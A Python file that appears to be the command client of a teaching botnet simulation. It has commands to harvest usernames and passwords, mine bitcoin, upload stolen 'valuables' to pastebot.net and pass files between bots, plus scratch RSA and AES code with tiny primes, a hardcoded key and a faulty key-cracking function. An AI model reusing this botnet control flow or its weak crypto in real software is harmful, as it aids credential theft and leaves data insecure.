import socket
import time
import threading
import sys
import struct
import fractions
from Crypto.Hash import SHA256

from lib.RobotRichardSimmons import RobotRichardSimmons
from lib.comms import StealthConn
from lib.evil import bitcoin_mine, harvest_user_pass
from lib.p2p import find_bot, bot_server
from lib.files import download_from_pastebot, filestore, p2p_upload_file, save_valuable, upload_valuables_to_pastebot, \
    valuables
from lib.helpers import read_hex
from Crypto.Cipher import AES


def p2p_upload(fn):
    sconn = find_bot()
    sconn.send(bytes("FILE", "ascii"))
    p2p_upload_file(sconn, fn)


def p2p_echo():
    try:
        sconn = find_bot()
        sconn.send(bytes("ECHO", "ascii"))
        while 1:
            # Read a message and send it to the other bot
            msg = input("Echo> ")
            byte_msg = bytes(msg, "ascii")
            sconn.send(byte_msg)
            # This other bot should echo it back to us
            echo = sconn.recv()
            # Ensure that what we sent is what we got back
            assert (echo == byte_msg)
            # If the msg is X, then terminate the connection
            if msg.lower() == 'x' or msg.lower() == "exit" or msg.lower() == "quit":
                sconn.close()
                break
    except socket.error:
        print("Connection closed unexpectedly")


def phi(n):
    result = n
    i = 2
    while i * i <= n:
        if n % i == 0:
            while n % i == 0:
                n //= i
            result -= result // i
        i += 1
    if n > 1:
        result -= result // n
    return result


def crack_key(k1, k2):
    for i in range(1, k2 + 1):
        foo = 1 + i * phi(k1)

        if (foo % k2 == 0):
            return 1 / k2 * (1 + i * phi(k1))


def encrypt(k1, k2, msg):
    # bytes(data, "ascii")
    return msg ** k2 % k1


def decrypt(k1, prKey, ciph):
    return ciph ** prKey % k1


def is_prime(n):
    if n == 2 or n == 3:
        return True
    if n < 2 or n % 2 == 0:
        return False
    if n < 9:
        return True
    if n % 3 == 0:
        return False
    r = int(n ** 0.5)
    f = 5
    while f <= r:
        if n % f == 0: return False
        if n % (f + 2) == 0: return False
        f += 6
    return True


def egcd(a, b):
    if a == 0:
        return b, 0, 1
    else:
        g, y, x = egcd(b % a, a)
        return g, x - (b // a) * y, y


def modular_inverse(a, m):
    g, x, y = egcd(a, m)
    if g != 1:
        raise Exception('modular inverse does not exist')
    else:
        return x % m

if __name__ == "__main__":

    if True:

        p = 7
        q = 16381
        assert is_prime(p)
        assert is_prime(q)

        n = p * q

        phiN = phi(p * q)

        print("Max message length : {}".format(phiN - 1))

        # can also be lcm(p-1,q-1)
        pub_key = 67

        assert phiN == (p - 1) * (q - 1)
        assert 1 < pub_key < phiN
        assert fractions.gcd(pub_key, phiN) == 1

        pr_key = modular_inverse(pub_key, phiN)

        assert pr_key * pub_key % phiN == 1

        msg = 'it'.encode()
        msg_size = len(msg)
        msg_int = int.from_bytes(msg, byteorder='big')
        print("Original data: {}".format(msg))
        print("Original data length: {}".format(msg_size))

        encrypted = msg_int ** pub_key % n

        print("Original data formatted: {}".format(msg_int))

        print("Encrypted data: {}".format(encrypted))

        decrypted = encrypted ** pr_key % n

        print("Decrypted data: {}".format(decrypted))

        # assert encrypted ** pr_key % n == msg_int ** (pub_key * pr_key) % n
        assert msg_int == decrypted
        print(msg_int.to_bytes(2, byteorder='big'))

        msg_hash = SHA256.new()
        msg_hash.update(msg)
        print(msg_hash.hexdigest().encode())

        msg_hash_int = int.from_bytes(msg_hash.hexdigest().encode()[:2], byteorder='big')
        print(msg_hash_int)
        msg_sign = msg ** pr_key % n

        sys.exit()

        encrypted_data = encrypt(899, 17, 65)
        print("Encrypted data: {}".format(repr(encrypted_data)))
        private_key = crack_key(899, 17)

        print("Cracked private key: {}".format(repr(private_key)))

        decrypted_data = decrypt(899, 593, 53)
        print("Decrypted data: {}".format(decrypted_data))
        sys.exit()

        shared_key = 'askldfjasdgldljsalglsajglasjldsjfoweijfsandblhsaghaiwejgfaldsjglawiejglajglksagllilsigehsgdnbsei'[
                     :32]
        cipher = AES.new(shared_key)

        data = 'this is the new shit'
        print("Original data: {}".format(data))
        print("Original data length: {}".format(len(data)))

        data = bytes(data, "ascii")
        length = 16 - (len(data) % 16)
        data += ' '.encode() * length

        print("Padded data length: {}".format(len(data)))

        encrypted_data = cipher.encrypt(data)

        print("Encrypted data: {}".format(repr(encrypted_data)))
        print("Sending packet of length {}".format(len(encrypted_data)))

        pkt_len_packed = struct.pack('H', len(encrypted_data))

        unpacked_contents = struct.unpack('H', pkt_len_packed)
        pkt_len = unpacked_contents[0]

        decrypted_data = cipher.decrypt(encrypted_data)
        print("Receiving packet of length {}".format(pkt_len))
        print("Encrypted data: {}".format(repr(encrypted_data)))
        print("Decrypted data: {}".format(decrypted_data))
        print("Original data: {}".format(decrypted_data.decode("ascii").rstrip()))

    # Start a new thread to accept P2P echo or P2P upload requests
    thr = threading.Thread(target=bot_server)
    # Daemon threads exit when the main program exits
    # This means the server will shut down automatically when we quit
    thr.setDaemon(True)
    thr.start()
    # Wait for a small amount of time so that the output
    # doesn't play around with our "command prompt"
    time.sleep(0.3)

    while 1:
        # Naive command loop
        # There are better ways to do this, but the code should be clear
        raw_cmd = input("Enter command: ")
        cmd = raw_cmd.split()
        if not cmd:
            print("You need to enter a command...")
            continue
        # P2P Commands
        # Echo is primarily meant for testing (the receiver will echo what it hears back)
        # Upload allows for peer-to-peer file transfer to other bots
        if cmd[0].lower() == "p2p":
            if len(cmd) > 1:
                if cmd[1].lower() == "echo":
                    p2p_echo()
                if cmd[1].lower() == "upload":
                    if len(cmd) == 3:
                        p2p_upload(cmd[2])
                    else:
                        print("Format is 'p2p upload <filename>'")
            else:
                print("The p2p command requires either 'echo' or 'upload' after it")
        # Download a file (update or data) from pastebot.net
        elif cmd[0].lower() == "download":
            if len(cmd) == 2:
                download_from_pastebot(cmd[1])
            else:
                print("The download command requires a filename afterwards")
        # Upload the valuables/secrets the bot has discovered to pastebot.net
        elif cmd[0].lower() == "upload":
            if len(cmd) == 2:
                upload_valuables_to_pastebot(cmd[1])
            else:
                print("The upload command requires a filename afterwards")
        # Mine for Bitcoins
        # This is far more intensive in the real world, but we'll just pretend ;)
        elif cmd[0].lower() == "mine":
            print("Mining for Bitcoins...")
            bit_addr = bitcoin_mine()
            save_valuable("Bitcoin: %s" % bit_addr)
            print("Mined and found Bitcoin address: %s" % bit_addr)
        # Harvest a user's username and password (userpass)
        elif cmd[0].lower() == "harvest":
            userpass = harvest_user_pass()
            save_valuable("Username/Password: %s %s" % userpass)
            print("Found user pass: %s" % (userpass,))
        # List files and valuables (secrets such as userpass & bitcoins) the bot has
        elif cmd[0].lower() == "list":
            print("Files stored by this bot: %s" % ", ".join(filestore.keys()))
            print("Valuables stored by this bot: %s" % valuables)
        # Exit command
        elif cmd[0].lower() == "quit" or cmd[0].lower() == "exit":
            break
        else:
            print("Command not recognised")
